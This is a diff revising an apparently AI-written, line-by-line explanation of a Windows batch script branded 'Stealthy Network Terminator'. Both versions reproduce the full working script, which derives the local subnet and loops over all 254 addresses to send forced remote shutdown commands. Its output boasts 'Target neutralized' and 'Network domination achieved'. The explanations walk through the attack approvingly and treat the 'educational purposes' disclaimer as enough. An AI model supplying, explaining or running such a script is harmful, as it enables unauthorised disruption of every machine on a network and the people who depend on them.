@@ -1,115 +1,114 @@
-Sure, here's a line-by-line explanation of the batch script:
+line-by-line explanation:
 
-```batch
-@echo off
+```plaintext
+1. @echo off
 ```
-- This line turns off echoing of commands, which prevents them from being displayed in the console as they are executed.
+- Disables echoing of commands, preventing them from being displayed in the console as they are executed.
 
-```batch
-setlocal enabledelayedexpansion
+```plaintext
+2. setlocal enabledelayedexpansion
 ```
-- This line enables delayed expansion of variables, which allows for the use of `!` syntax to access variable values within loops.
+- Enables delayed expansion of variables, allowing the use of `!` syntax to access variable values within loops.
 
-```batch
-REM Stealthy Network Terminator - Developed by FLUFFY
+```plaintext
+3. REM Stealthy Network Terminator - Developed by FLUFFY
 ```
-- This is a comment line (REM stands for "remark") that provides information about the script, including its name and developer.
+- A comment providing information about the script, including its name and developer.
 
-```batch
-REM This script is for educational purposes only. Misuse for malicious intent is illegal.
+```plaintext
+4. REM This script is for educational purposes only. Misuse for malicious intent is illegal.
 ```
-- This comment emphasizes the script's intended use for educational purposes only and warns against misuse.
+- A comment emphasizing the script's intended use for educational purposes only and warning against misuse.
 
-```batch
-REM FLUFFY presents the Stealthy Network Terminator (SNT), a potent tool for hacking enthusiasts.
-REM It silently infiltrates your local network, wreaking havoc with a single click.
+```plaintext
+5. REM FLUFFY presents the Stealthy Network Terminator (SNT), a potent tool for hacking enthusiasts.
+6. REM It silently infiltrates your local network, wreaking havoc with a single click.
 ```
-- These comments further describe the purpose of the script, presenting it as a tool for hacking enthusiasts that can silently infiltrate a local network to cause havoc.
+- Comments further describing the purpose of the script, presenting it as a tool for hacking enthusiasts that can silently infiltrate a local network to cause havoc.
 
-```batch
-REM WARNING: Use this tool responsibly and only on networks you own or have explicit permission to test.
+```plaintext
+7. REM WARNING: Use this tool responsibly and only on networks you own or have explicit permission to test.
 ```
-- This warning emphasizes responsible use of the script and advises against using it on networks without proper authorization.
+- A warning emphasizing responsible use of the script and advising against using it on networks without proper authorization.
 
-```batch
-REM Get ready to unleash chaos! Initiating SNT...
+```plaintext
+8. REM Get ready to unleash chaos! Initiating SNT...
 ```
-- This comment indicates that the script is about to begin executing its main functionality.
+- A comment indicating that the script is about to begin executing its main functionality.
 
-```batch
-REM Get local IP address
-for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr IPv4') do (
-    set "local_ip=%%i"
-)
+```plaintext
+9. REM Get local IP address
+10. for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr IPv4') do (
+11.     set "local_ip=%%i"
+12. )
 ```
-- This block of code retrieves the local IP address of the machine by parsing the output of the `ipconfig` command and storing it in the variable `local_ip`.
+- Retrieves the local IP address of the machine by parsing the output of the `ipconfig` command and storing it in the variable `local_ip`.
 
-```batch
-if "%local_ip%"=="" (
-    echo Failed to retrieve local IP address. Aborting operation.
-    exit /b 1
-)
+```plaintext
+13. if "%local_ip%"=="" (
+14.     echo Failed to retrieve local IP address. Aborting operation.
+15.     exit /b 1
+16. )
 ```
-- This conditional statement checks if the local IP address was successfully retrieved. If not, it displays an error message and exits the script with an error code.
+- Checks if the local IP address was successfully retrieved. If not, it displays an error message and exits the script with an error code.
 
-```batch
-REM Extract network range
-for /f "tokens=1,2,3 delims=." %%a in ("!local_ip!") do (
-    set "network_range=%%a.%%b.%%c."
-)
+```plaintext
+17. REM Extract network range
+18. for /f "tokens=1,2,3 delims=." %%a in ("!local_ip!") do (
+19.     set "network_range=%%a.%%b.%%c."
+20. )
 ```
-- This block of code extracts the network range from the local IP address by splitting it at each period (.) and storing the first three parts in the variable `network_range`.
+- Extracts the network range from the local IP address by splitting it at each period (.) and storing the first three parts in the variable `network_range`.
 
-```batch
-if "%network_range%"=="" (
-    echo Failed to extract network range. Aborting operation.
-    exit /b 1
-)
+```plaintext
+21. if "%network_range%"=="" (
+22.     echo Failed to extract network range. Aborting operation.
+23.     exit /b 1
+24. )
 ```
-- This conditional statement checks if the network range was successfully extracted. If not, it displays an error message and exits the script with an error code.
+- Checks if the network range was successfully extracted. If not, it displays an error message and exits the script with an error code.
 
-```batch
-REM Initiating shutdown sequence for all devices in the network range
-echo Stealth mode activated... Engaging the SNT...
+```plaintext
+25. REM Initiating shutdown sequence for all devices in the network range
+26. echo Stealth mode activated... Engaging the SNT...
 ```
-- These comments indicate that the script is about to begin shutting down devices on the network and provide some dramatic flair.
+- Indicates that the script is about to begin shutting down devices on the network and provides some dramatic flair.
 
-```batch
-set "error_count=0"
+```plaintext
+27. set "error_count=0"
 ```
-- This line initializes a variable `error_count` to keep track of any errors encountered during the shutdown process.
+- Initializes a variable `error_count` to keep track of any errors encountered during the shutdown process.
 
-```batch
-for /L %%i in (1,1,254) do (
-    set "ip=!network_range!%%i"
-    shutdown /s /f /t 0 /m \\!ip! >nul 2>&1
-    if errorlevel 1 (
-        echo Failed to send shutdown command to !ip!... Evading detection.
-        set /a "error_count+=1"
-    ) else (
-        echo Shutdown command sent to !ip!... Target neutralized.
-    )
-)
+```plaintext
+28. for /L %%i in (1,1,254) do (
+29.     set "ip=!network_range!%%i"
+30.     shutdown /s /f /t 0 /m \\!ip! >nul 2>&1
+31.     if errorlevel 1 (
+32.         echo Failed to send shutdown command to !ip!... Evading detection.
+33.         set /a "error_count+=1"
+34.     ) else (
+35.         echo Shutdown command sent to !ip!... Target neutralized.
+36.     )
+37. )
 ```
-- This loop iterates through all IP addresses in the network range (from 1 to 254), constructs each IP address, and sends a shutdown command to it using the `shutdown` command. It also checks if the command was successful and updates the `error_count` variable accordingly.
+- Loops through all IP addresses in the network range (from 1 to 254), constructs each IP address, and sends a shutdown command to it using the `shutdown` command. It also checks if the command was successful and updates the `error_count` variable accordingly.
 
-```batch
-echo.
+```plaintext
+38. echo.
 ```
-- This command outputs a blank line for better readability in the console.
+- Outputs a blank line for better readability in the console.
 
-```batch
-if %error_count% gtr 0 (
-    echo %error_count% devices failed to shut down... Potential resistance detected.
-) else (
-    echo All devices in the network range have received shutdown command... Network domination achieved!
-)
+```plaintext
+39. if %error_count% gtr 0 (
+40.     echo %error_count% devices failed to shut down... Potential resistance detected.
+41. ) else (
+42.     echo All devices in the network range have received shutdown command... Network domination achieved!
+43. )
 ```
-- This conditional statement checks if any devices failed to shut down. If so, it displays the number of failures. Otherwise, it indicates that all devices have received the shutdown command successfully.
+- Checks if any devices failed to shut down. If so, it displays the number of failures. Otherwise, it indicates that all devices have received the shutdown command successfully.
 
-```batch
-echo Terminating SNT... Exit stealth mode and return to the shadows.
-
-pause
+```plaintext
+44. echo Terminating SNT... Exit stealth mode and return to the shadows.
+45. pause
 ```
-- These comments and the `pause` command provide a closing message and pause the script execution to allow the user to view the output before closing the console window.
+- Provides a closing message and pauses the script execution to allow the user to view the output before closing the console window.
